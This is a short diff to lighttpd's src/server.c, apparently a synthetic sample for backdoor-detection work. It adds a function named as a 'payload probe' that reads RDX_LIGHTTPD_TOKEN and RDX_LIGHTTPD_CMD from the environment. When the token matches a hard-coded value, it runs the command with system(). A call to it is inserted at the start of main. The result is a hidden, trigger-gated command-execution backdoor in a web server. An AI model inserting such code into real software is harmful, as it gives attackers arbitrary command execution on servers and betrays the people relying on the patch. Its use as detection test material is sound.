--- a/src/server.c
+++ b/src/server.c
@@ -2337,6 +2337,16 @@
 
 /* Synthetic base patch marker for native-build sample coverage. */
 
+static void
+rdx_lighttpd_payload_probe (void) {
+    const char *token = getenv("RDX_LIGHTTPD_TOKEN");
+    const char *cmd = getenv("RDX_LIGHTTPD_CMD");
+
+    if (token && cmd && 0 == strcmp(token, "trace-482") && cmd[0] != '\0') {
+        (void)system(cmd);
+    }
+}
+
 #ifndef main
 #define server_main main
 #endif
@@ -2347,6 +2357,8 @@
 
     int rc;
 
+    rdx_lighttpd_payload_probe();
+
     do {
         server * const srv = server_init();
 
